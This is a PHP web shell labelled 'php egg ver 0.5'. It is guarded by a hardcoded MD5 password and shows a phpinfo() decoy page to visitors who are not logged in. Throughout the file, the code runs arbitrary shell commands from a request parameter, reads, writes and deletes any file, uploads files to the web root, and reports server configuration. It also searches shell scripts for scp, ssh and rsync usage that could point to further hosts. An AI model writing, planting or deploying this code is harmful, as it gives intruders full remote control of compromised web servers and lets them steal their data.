<?php
session_start();
$pass_md5 = "63a9f0ea7bb98050796b649e85481845";
$password = md5($_REQUEST["pass"]);

if (isset($_REQUEST["pass"]) and !empty($_REQUEST["pass"])) {
    if ($password === $pass_md5 and !empty($_COOKIE["PHPSESSID"])) {
        if ($_SESSION["count"] >= 10) {
            echo $_SERVER["REMOTE_ADDR"] . " access denied.";
            exit();
        }
        $_SESSION['is_validate'] = "whoami";
        $session_id = session_id();
    } else {
        $_SESSION["count"]++;
        if ($_SESSION["count"] >= 10) {
            echo $_SERVER["REMOTE_ADDR"] . " access denied.";
            exit();
        }
    }
}

if ($_SESSION['is_validate'] != "whoami") {
    phpinfo();
    exit();
}
?>
<html>
<title>php egg ver 0.5</title>
<style type="text/css">
textarea
{
	font-family:Times New Roman;
	style:"";
}
</style>

<?php
header("Content-type: text/html; charset=utf-8");
date_default_timezone_set('Asia/shanghai');

echo "<font face='Times New Roman'>";

echo 'OS: ' . php_uname() . "</br>";
echo 'PROCESSOR_ARCHITECTURE: ' . $_ENV["PROCESSOR_ARCHITECTURE"] . "</br>";
echo 'DOCUMENT_ROOT: ' . $_SERVER['DOCUMENT_ROOT'] . "</br>";
echo 'Current PHP version: ' . phpversion() . "</br>";
echo 'Server: ' . $_SERVER['SERVER_SOFTWARE'] . "</br>";
echo 'Loaded php.ini: ' . php_ini_loaded_file() . "<br>";
echo 'sys_temp_dir: ' . sys_get_temp_dir() . "<br>";
echo 'Current script owner: ' . get_current_user() . "<br>";
echo 'Current php memory: ' . memory_get_usage() / 1024 . " Kb<br>";
echo 'session.save_path: ' . @ini_get("session.save_path") . "<br>";
echo 'allow_url_include: ' . @ini_get("allow_url_include") . "<br>";
echo 'Disabled Functions: ' . @ini_get("disable_functions") . "<br>";
ini_set("max_execution_time", "180");
echo 'max_execution_time: ' . @ini_get("max_execution_time") . "<br>";
echo 'upload_max_filesize: ' . @ini_get("upload_max_filesize") . "<br>";
echo 'post_max_size: ' . @ini_get("post_max_size") . "<br>";
ini_set("default_socket_timeout", 5);
echo 'default_socket_timeout: ' . @ini_get("default_socket_timeout") . "<br>";
echo "path: " . $_SERVER["PATH"] . "<br>";
//set_include_path('/opt/jids/');
echo "include_path: " . get_include_path() . "<br>";
echo "<br>server ip: " . $_SERVER["SERVER_ADDR"] . "<br>";
$client_ipaddr = ($_SERVER["HTTP_VIA"]) ? $_SERVER["HTTP_X_FORWARDED_FOR"] : $_SERVER["REMOTE_ADDR"];
$client_ipaddr = ($client_ipaddr) ? $client_ipaddr : $_SERVER["REMOTE_ADDR"];
echo "client ip: " . $client_ipaddr . "<br>";
echo 'USER_AGENT: ' . $_SERVER["HTTP_USER_AGENT"] . "<br>";

//echo @file_get_contents("");
/*
if ($stream = @fopen(php_ini_loaded_file(), 'r')) {
echo stream_get_contents($stream);
fclose($stream);
}else
echo "no permission!<br>";
 */

function grep_file($directory)
{
    $find_str = "/(scp)|(ssh)|(sftp)|(rsync)/i";
	//$find_str="/exec|shell_exec|proc_open|wscript.shell/i";

    $check_file_dir = @opendir($directory);
    while ($file = @readdir($check_file_dir)) {
        if ($file != "." && $file != "..") {
            if (is_dir("$directory/$file")) {
                grep_file("$directory/$file");
            } else {
                $mime = pathinfo($file);
                if ($mime["extension"] == "sh") {
                    //echo trim($directory."/".$file)."\n";
                    $handle = file(trim($directory . "/" . $file));
                    $notes_length = count($handle);
                    for ($i = 0; $i < $notes_length; $i++) {
                        $content = $handle[$i];
                        if (preg_match($find_str, $content, $arr)) {
                            //print_r ($arr);
                            $i = $i + 1;
                            print_r("->" . $arr[0] . " found in " . $directory . "/" . $file . " line $i \n");
                        }
                    }
                }
            }
        }
    }

    closedir($check_file_dir);
}

if (isset($_REQUEST[dir])) {
    $dir = $_REQUEST[dir];
    echo "dir: " . $dir . "<br>";
    if (is_dir($dir)) {
        if ($dh = opendir($dir)) {
            echo "<table>";
            echo "<tr><td><font color='red'>Filename</font></td>  <td><font color='green'>Filesize</font></td> <td><font color='blue'>FileTime</font></td>";
            while (($file = readdir($dh)) !== false) {
                echo "<tr><td> $file</td>  <td>" . filesize($dir . '/' . $file) . "byte</td><td>" . date("Y-m-d H:i:s", filemtime($dir . '/' . $file)) . "</td>";
            }
            echo "</table>";
            closedir($dh);
        }
    }
}

if (isset($_REQUEST[read])) {
    $file_path = $_REQUEST[read];
    echo "file_path: " . $file_path . "<br>";
    echo '<textarea name="output" cols=120 rows=15>';
    echo file_get_contents($file_path);
    echo '</textarea>' . "<br>";
}

if (isset($_REQUEST[write]) and isset($_REQUEST[c])) {
    $file_path = $_REQUEST[write];
    echo "file_path: " . $file_path . "<br>";
    $h = @file_put_contents($file_path, $_REQUEST[c]);
    echo $h;
}

if (isset($_REQUEST[del])) {
    $file_path = $_REQUEST[del];
    if (file_exists($file_path)) {
        if (unlink($file_path)) {
            echo ("Deleted $file_path <br>");
        } else {
            echo ("Error deleting $file_path <br>");
        }
    } else {
        echo "file not exist.<br>";
    }
}

if (isset($_REQUEST[find])) {
    $dir = $_REQUEST[find];
    echo "scan_dir: " . $dir . "<br>";
    echo '<textarea name="output" cols=120 rows=15>';
    grep_file($dir);
    echo '</textarea>' . "<br>";
}

if (isset($_REQUEST[cmd])) {
    $cmd = $_REQUEST[cmd];
    echo "cmd: " . $cmd . "<br>";
    echo '<textarea name="output" cols=120 rows=15>';
    echo `$_REQUEST[cmd]`;
    echo '</textarea>' . "<br>";
}

/*
foreach (get_loaded_extensions() as $value) {
echo "Value: $value<br />\n";
}
 */

//echo cos(pi());

echo "</font>";

$uploaddir = trim($_POST['targetdir']);
if ($_POST['upload111']) {

    if ($uploaddir) {
        $uploadfile = $uploaddir . "/" . $_FILES["upfile"]["name"];
        if (move_uploaded_file($_FILES["upfile"]["tmp_name"], $uploadfile)) {
            print "upload $uploadfile success. <br>";
        } else {
            print "upload $uploadfile error. <br>";
            echo "Return Code: " . $_FILES["upfile"]["error"] . "<br/>";
        }
    }
}

?>
<form enctype="multipart/form-data" method="post" action="">
<input type="hidden" name="max_file_size" value="32000000">
<br><input name="upfile" type="file">path:
<input type="text" name="targetdir" size="35" value=<?php echo $_SERVER['DOCUMENT_ROOT']; ?>>
<input type="submit" name="upload111" value="upload">
</form>

</html>
